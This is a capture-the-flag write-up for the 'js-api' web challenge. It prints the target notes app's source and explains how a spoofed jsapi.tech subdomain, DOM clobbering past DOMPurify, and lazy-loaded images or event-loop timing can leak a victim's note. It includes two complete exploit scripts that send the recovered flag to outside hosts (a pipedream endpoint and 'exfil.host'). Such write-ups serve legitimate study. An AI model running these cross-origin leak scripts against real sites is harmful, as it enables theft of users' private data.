# js-api

## Description

> We hired a new developer @sohomdatta1, dude coded something, we sent it for a security audit, it came back a sea of red :(

## Solution

This challenge had the same premise as [Undocumented js-api](undocumented-js-api.md). This time, the JavaScript source is different (and slightly more complex).

```javascript
window.addEventListener('load', async () => {

    function NOTREACHED() {
        // destroy currently availiable data
        // Challenge Author (sohom): 
        // if you are hitting this codepath repeatedly
        // please use a incognito window, your ad-blocker
        // or other extensions might be sending spurious postMessages
        // to this page
        window.location.href = `https://www.youtube.com/watch?v=FtutLA63Cp8`
    }

    function escapeHtml(unsafe) {
        return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
    }



    class NotesManager {
        constructor() {
            this.noteData = window.localStorage.getItem( 'note' ) || '';
            this.noteTextArea = document.querySelector( '#note-text-area' );
            this.noteTextArea.value = this.noteData;
            this.previewNode = document.querySelector( '#output' );
            this.highlightNode = document.querySelector( '#note-search-highlights' )
            this.noteManager = this;
        }

        static getCurrentNoteManager() {
            if ( !this.noteManager ) {
                this.noteManager = new NotesManager();
            }
            return this.noteManager;
        }

        getNotesTextAreaValue() {
            return this.noteTextArea.value
        }
    
        get() {
            return this.noteData.toString();
        }
    
        set(text) {
            if ( typeof text !== 'string' ) return;
            const cleanedText = DOMPurify.sanitize(text);
            this.noteData = cleanedText;
            window.localStorage.setItem( 'note', cleanedText.toString() ); 
        }
    
        /**
         * Previews text, if text is null will preview existing note
         * @param {String} [text] String to preview
         */
        preview(text) {
            if ( typeof text !== 'string' && !!text ) return;
            if ( !text ) text = this.noteData;
            else text = DOMPurify.sanitize( text );
            this.previewNode.innerHTML = text;
        }
    
        /**
         * Search for the particular text
         * @param {String} text text to search for
         */
        search(text) {
            if ( typeof text !== 'string' ) return;
            if ( !window.enable_experimental_features ) return;
            // TODO(sohom): Address concerns raised by our internal security
            // team regarding this API at b/1337. Given that this API
            // is effectively a no-op and is not current exposed anywhere
            // as of version 0.0.1 it should be fine for now.
            // Since our internal bug tracker is well, "internal"
            // I have dumped relevant portion of the b/1337 at
            // https://github.com/sohomdatta1/jsapi-issues/issues/1
            text = DOMPurify.sanitize( text );
            const doesMatch = this.noteData.includes(text);
            if ( doesMatch ) {
                var lastIndex = 0, i = 0;
                for(var i = this.noteData.substring(i).indexOf(text); i < this.noteData.length; i = i + text.length + this.noteData.substring(i + text.length).indexOf(text)) {
                    if ( lastIndex > i ) break;
                    this.highlightNode.innerHTML += escapeHtml( this.noteData.substring(lastIndex,i) );
                    this.highlightNode.innerHTML += `<mark>${escapeHtml( text ) }</mark>`
                    lastIndex = i + text.length;
                }
                document.querySelector( '#note-text-highlight-wrapper' ).classList.remove( 'hidden' );
            }
        }
    }

    // initialize the document
    NotesManager.getCurrentNoteManager();
    NotesManager.getCurrentNoteManager().preview();

    window.document.querySelector( '#note-submit' ).addEventListener( 'click', (e) => {
        e.preventDefault();
        const nm = NotesManager.getCurrentNoteManager();

        nm.set( nm.getNotesTextAreaValue() );
        nm.preview();
    } );

    window.document.querySelector( '#note-save' ).addEventListener( 'click', (e) => {
        e.preventDefault();
        const nm = NotesManager.getCurrentNoteManager();

        nm.set( nm.getNotesTextAreaValue() );
    } );

    window.document.querySelector( '#note-render' ).addEventListener( 'click', (e) => {
        e.preventDefault();
        const nm = NotesManager.getCurrentNoteManager();

        nm.preview( nm.getNotesTextAreaValue() );
    } );

    /**
     * @experimental Added in 0.0.2
     */
    window.addEventListener( 'message', (e) => {
        if ( !e.origin.endsWith('jsapi.tech') ) return;
        const data = e.data;
        if ( typeof data !== 'object' && typeof data.op !== 'string' && typeof data.payload !== 'string' ) return;
        if ( data.op === 'preview' ) {
            NotesManager.getCurrentNoteManager().preview( data.payload );
        } else if ( data.op === 'set' ) {
            NotesManager.getCurrentNoteManager().set( data.payload );
        } else if ( data.op === 'search' ) {
            NotesManager.getCurrentNoteManager().search( data.payload );
        } else {
            NOTREACHED();
        }
    } );

});
```

The important part is, once again, the message event handler. Just like the previous challenge, we had to use a subdomain takeover to serve an exploit page from a `.jsapi.tech` subdomain.

```javascript
window.addEventListener( 'message', (e) => {
    if ( !e.origin.endsWith('jsapi.tech') ) return;
    const data = e.data;
    if ( typeof data !== 'object' && typeof data.op !== 'string' && typeof data.payload !== 'string' ) return;
    if ( data.op === 'preview' ) {
        NotesManager.getCurrentNoteManager().preview( data.payload );
    } else if ( data.op === 'set' ) {
        NotesManager.getCurrentNoteManager().set( data.payload );
    } else if ( data.op === 'search' ) {
        NotesManager.getCurrentNoteManager().search( data.payload );
    } else {
        NOTREACHED();
    }
} );
```

One interesting feature in this version of the challenge is that we can "preview" our HTML _without saving it_. Everything is still sanitized through DOMPurify.

```javascript
/**
 * Previews text, if text is null will preview existing note
 * @param {String} [text] String to preview
 */
preview(text) {
    if ( typeof text !== 'string' && !!text ) return;
    if ( !text ) text = this.noteData;
    else text = DOMPurify.sanitize( text );
    this.previewNode.innerHTML = text;
}
```

In the preview feature, we can insert sanitized HTML without changing `this.noteData`. When using the search feature, the original `this.noteData` is the one being searched for our input text.

```javascript
/**
 * Search for the particular text
 * @param {String} text text to search for
 */
search(text) {
    if ( typeof text !== 'string' ) return;
    if ( !window.enable_experimental_features ) return;
    // TODO(sohom): Address concerns raised by our internal security
    // team regarding this API at b/1337. Given that this API
    // is effectively a no-op and is not current exposed anywhere
    // as of version 0.0.1 it should be fine for now.
    // Since our internal bug tracker is well, "internal"
    // I have dumped relevant portion of the b/1337 at
    // https://github.com/sohomdatta1/jsapi-issues/issues/1
    text = DOMPurify.sanitize( text );
    const doesMatch = this.noteData.includes(text);
    if ( doesMatch ) {
        var lastIndex = 0, i = 0;
        for(var i = this.noteData.substring(i).indexOf(text); i < this.noteData.length; i = i + text.length + this.noteData.substring(i + text.length).indexOf(text)) {
            if ( lastIndex > i ) break;
            this.highlightNode.innerHTML += escapeHtml( this.noteData.substring(lastIndex,i) );
            this.highlightNode.innerHTML += `<mark>${escapeHtml( text ) }</mark>`
            lastIndex = i + text.length;
        }
        document.querySelector( '#note-text-highlight-wrapper' ).classList.remove( 'hidden' );
    }
}
```

The search feature checks for `window.enable_experimental_features`, which is a property that doesn't exist... or does it?

DOMPurify doesn't protect against DOM clobbering, so we can pollute this property by inserting the following HTML through the preview feature.

```html
<a href="asdf" id="enable_experimental_features">CLOBBERED</a>
```

### Unintended Solution

When the text that we are searching is found in the victim's note, a new `<div>` is rendered with the search results (`#note-text-highlight-wrapper` has its `hidden` class removed).

For instance, the following shows a correct search (where the searched content is a substring of the flag).

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-29 at 3.51.43 AM (2).png" alt=""><figcaption></figcaption></figure>

And the following shows an incorrect search, where no matches are found. Notice how the extra `<div>` in the correct search was sufficient to push the previewed content out of the viewport.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-29 at 3.55.53 AM.png" alt=""><figcaption></figcaption></figure>

We can make use of [image lazy loading](https://web.dev/browser-level-image-lazy-loading/) to only load an image if it is within the browser viewport. This way, we are able to tell if the results section was rendered.

```markup
<a href="asdf" id="enable_experimental_features">CLOBBERED</a>
<img src="https://EXFIL.x.pipedream.net?nope=${CURR_FLAG + char}" loading="lazy">
```

If we do _not_ receive a request for a particular character, that means that the results section was rendered, and therefore the search was a correct guess.

The following script implements this exploit.

```javascript
const sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
}

(async () => {
    const CURR_FLAG = "nite{hello_longtasktimingapi_3a2c53"
    const CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_}"

    for (let char of CHARSET) {
        const frame = document.createElement("iframe")
        frame.width = "100%"
        frame.height = "100%"
        frame.src = "https://challenge.jsapi.tech"
        document.body.appendChild(frame)
        
        await sleep(500);

        frame.contentWindow.postMessage(
            {
                op: "preview",
                payload: `<a href="asdf" id="enable_experimental_features">CLOBBERED</a><img src="https://enrueq28ozwok.x.pipedream.net?nope=${CURR_FLAG + char}" loading="lazy">`
            },
            "*"
        )
        frame.contentWindow.postMessage(
            {
                op: "search",
                payload: CURR_FLAG + char
            },
            "*"
        )
        
        await sleep(500);

        frame.remove()
    }
})()
```

### Intended Solution

The intended solution was to use the [PerformanceLongTaskTiming API](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) to identify if the search was taking more than 50ms.

It turns out, however, any timing attack with `performance.now()` would have worked as well.

Because the JavaScript event loop is single-threaded, we just need to use `setTimeout` to temporarily pass control to the next thing in the callback queue (which is the message handler taking care of the `search` request), then find out how long it took for control to be passed _back_ to our exploit script.

Although the `setTimeout` is only for 1ms, it takes much longer in reality for execution to resume because the expensive `search` function blocks the event loop. By measuring this discrepancy, we can find out if our guess was correct.

```javascript
const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

async function check(flag) {
    let w = frame.contentWindow;
    w.postMessage({'op': 'preview', 'payload': '<img name="enable_experimental_features">'}, '*');
    await sleep(1);
    w.postMessage({'op': 'search', 'payload': flag}, '*');
    let t1 = performance.now();
    await sleep(1);
    return (performance.now() - t1) > 200;
}

async function main() {
    let alpha = 'abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ-}';
    window.frame = document.createElement('iframe');
    frame.width = '100%';
    frame.height = '700px';
    frame.src = 'https://challenge.jsapi.tech/';
    document.body.appendChild(frame);
    await sleep(1000);

    let flag = 'nite{';
    while(1) {
        for(let c of alpha) {
            let result = await Promise.race([
                check(flag + c),
                new Promise((res) => setTimeout(() => { res(true); }, 300))
            ]);
            console.log(flag + c, result);
            if(result) {
                flag += c;
                break;
            }
        }
        new Image().src = '//exfil.host/log?' + encodeURIComponent(flag);
    }
}

document.addEventListener('DOMContentLoaded', main);
```
